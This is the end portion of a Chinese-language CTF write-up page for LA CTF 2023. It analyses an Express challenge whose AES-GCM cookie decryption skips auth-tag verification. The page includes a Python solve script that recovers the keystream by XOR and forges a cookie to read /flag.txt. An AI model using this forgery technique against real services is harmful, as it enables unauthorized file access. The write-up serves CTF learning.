+<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">cipher</span><span class="p">.</span><span class="nx">update</span><span class="p">(</span><span class="nx">ct</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s2">&quot;utf8&quot;</span><span class="p">));</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">fs</span><span class="p">.</span><span class="nx">existsSync</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">tmpfile</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">makeAuth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">);</span>
+<span class="w">            </span><span class="k">return</span><span class="p">;</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">makeAuth</span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">,</span><span class="w"> </span><span class="nx">next</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">next</span><span class="p">();</span>
+<span class="p">}</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">cookieParser</span><span class="p">());</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nx">urlencoded</span><span class="p">({</span><span class="w"> </span><span class="nx">extended</span><span class="o">:</span><span class="w"> </span><span class="kc">false</span><span class="w"> </span><span class="p">}));</span>
+<span class="nx">app</span><span class="p">.</span><span class="nx">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="k">static</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;static&quot;</span><span class="p">)));</span>
+
+<span class="kd">const</span><span class="w"> </span><span class="nx">template</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="s2">&quot;index.html&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf8&quot;</span><span class="p">);</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">needsAuth</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">type</span><span class="p">(</span><span class="s2">&quot;text/html&quot;</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="nx">template</span><span class="p">.</span><span class="nx">replace</span><span class="p">(</span><span class="s2">&quot;$CONTENT&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">tmpfile</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;utf8&quot;</span><span class="p">)));</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s2">&quot;/update&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">needsAuth</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="ow">typeof</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">content</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="s2">&quot;string&quot;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">locals</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">tmpfile</span><span class="p">,</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">content</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">2048</span><span class="p">),</span><span class="w"> </span><span class="s2">&quot;utf8&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span><span class="w"> </span><span class="p">{}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">);</span>
+<span class="p">});</span>
+
+<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Listening on port </span><span class="si">${</span><span class="nx">port</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
+<span class="p">});</span>
+</pre></div>
+</div>
+<p><strong>题目分析</strong></p>
+<p>首先给出相关库文档：</p>
+<ul class="simple">
+<li><p>crypto 是 Node.js 的一个库：https://nodejs.org/api/crypto.html#cipherfinaloutputencoding</p></li>
+<li><p>fs 是 Node.js 的一个库：https://nodejs.org/api/fs.html#fsreaddirsyncpath-options</p></li>
+</ul>
+<p>由于都是英文版，所以简单说说代码中几个函数是干啥的：</p>
+<ul class="simple">
+<li><p>createCipheriv 是使用给定的算法、密钥和初始向量实例化一个 Cipher 类对象</p></li>
+<li><p>cipher.update(data)：用 data 更新此 cipher，在调用 final() 方法之前此方法可多次调用。我猜测这个方法表示加密的意思。</p></li>
+<li><p>cipher.final()：一旦调用此方法，就意味着不可以再加密数据。我猜测这可能表示加密完成的意思。</p></li>
+<li><p>cipher.getAuthTag()：文档说加密完成之后要调用这个方法。</p></li>
+<li><p>createDecipheriv：和 createCipheriv 类似，但是创建一个 Decipher 类对象</p></li>
+<li><p>setAuthTag：这个比较重要，贴出英文原图：</p></li>
+</ul>
+<p><img alt="" src="https://i.imgur.com/4BG8Ihe.png" /></p>
+<p>文档告诉我们当使用身份验证的加密模式时（目前Node支持 GCM、CCM、OCB、chacha20 等四种），decipher.setAuthTag() 方法被用于传入收到的鉴权标签。若没有提供标签或者密文被篡改，那么 decipher.final() 将会抛出异常，表明密文由于失败的身份验证应被丢弃。</p>
+<p>最最重要的一点是当调用 用于 GMC 和 OCB 模式的 <code class="docutils literal notranslate"><span class="pre">decipher.final()</span></code> 方法之前一定要调用 decipher.setAuthTag() 方法。然而题目的代码压根就没调用过 <code class="docutils literal notranslate"><span class="pre">decipher.final()</span></code> 方法，出题人说这会导致不进行密文的身份验证，这意味着我们可以篡改密文！</p>
+<p>坦白地说我对 GCM 是什么并不了解，但是出题人告诉我们没有 auth tag check 的 GCM 仅仅是 CTR模式，这意味着加密算法变成了一个流密码加密。</p>
+<p>代码中已经明确告知了加密数据的前一部分是 <code class="docutils literal notranslate"><span class="pre">/tmp/pastes</span></code>，通过将密文截断为同长度的字节就可以拿到和这段明文相对应的密文，根据流密码加密原理，此时我们将密文异或上明文就可以得到密钥。这意味着我们可以加密任意一个明文，在本题我们肯定是想加密 <code class="docutils literal notranslate"><span class="pre">{&quot;tmpfile&quot;:&quot;/flag.txt&quot;}</span></code>，下面给出我的 WP：</p>
+<div class="highlight-python= notranslate"><div class="highlight"><pre><span></span>import base64
+
+test = b&quot;RfRhJmZxvROE0rdLlUCij+6wbYtEAV/Fx0lATgy6fQK/z+wVfaDOW3MgzJ3c3PiRRO79m4gLit2/RLyeBTo=&quot;
+t1 = base64.b64decode(test)[:23]
+print(t1)
+
+t2 = b&#39;{&quot;tmpfile&quot;:&quot;/tmp/pastes&#39;
+from pwn import xor
+key  = xor(t1,t2)
+
+m = b&#39;{&quot;tmpfile&quot;:&quot;/flag.txt&quot;}&#39;
+ans = xor(m,key)
+
+print(ans)
+print(base64.b64encode(ans))
+
+</pre></div>
+</div>
+</section>
+</section>
+<section id="crypto">
+<h2>Crypto<a class="headerlink" href="#crypto" title="Permalink to this heading"></a></h2>
+<section id="id1">
+<h3>前言<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
+<p>等待更新中，不过看了一下难题并不多。</p>
+</section>
+</section>
+<section id="id2">
+<h2>参考链接<a class="headerlink" href="#id2" title="Permalink to this heading"></a></h2>
+<p>官方discord：<a class="reference external" href="https://discord.com/channels/977474896793853962/978575363573686315">(814) Discord | #📢announcements | LA CTF</a></p>
+<p>官方：https://hackmd.io/&#64;lamchcl/r1zQkbvpj</p>
+<p>关于警察局那一题：https://github.com/uclaacm/lactf-archive/blob/master/2023/web/california-state-police/solve.txt</p>
+<p><a class="reference external" href="https://siunam321.github.io/ctf/LA-CTF-2023/Web/my-chemical-romance/">my-chemical-romance | Siunam’s Website (siunam321.github.io)</a></p>
+</section>
+</section>
+
+
+           </div>
+          </div>
+          <footer>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Copyright 2023, MirRoR4s.</p>
+  </div>
+
+  Built with <a href="https://www.sphinx-doc.org/">Sphinx</a> using a
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">theme</a>
+    provided by <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
